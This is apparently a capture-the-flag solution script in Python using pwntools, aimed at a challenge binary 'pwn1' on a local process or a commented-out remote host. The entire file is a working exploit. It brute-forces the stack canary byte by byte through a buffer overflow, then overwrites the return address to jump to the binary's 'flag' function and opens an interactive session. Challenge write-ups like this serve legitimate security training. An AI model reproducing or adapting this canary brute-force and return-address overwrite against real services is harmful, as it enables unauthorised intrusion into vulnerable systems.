#!/usr/bin/env python

from pwn import *
context.arch = "amd64"
context.timeout = 30
#context.log_level = "debug"

r = process("./pwn1")
#r = remote("chall2.haruulzangi.mn", 30017)
e = ELF("./pwn1")

padding = "\0"*0x68
canary = ""
r.recvuntil("path?\n")
for i in range(8):
    for j in range(256):
        print("Trying byte {}".format(i+1))
        r.send(padding + canary + chr(j))
        res = r.recvuntil("path")
        if(b"Loading..." in res):
            canary += chr(j)
            success("Success on byte {} : {}".format(i+1, hex(j)))
            break;

success("Canary : %s" % canary)
r.sendline(flat(padding, canary, "\0"*8, e.sym.flag))

r.interactive()
r.close()
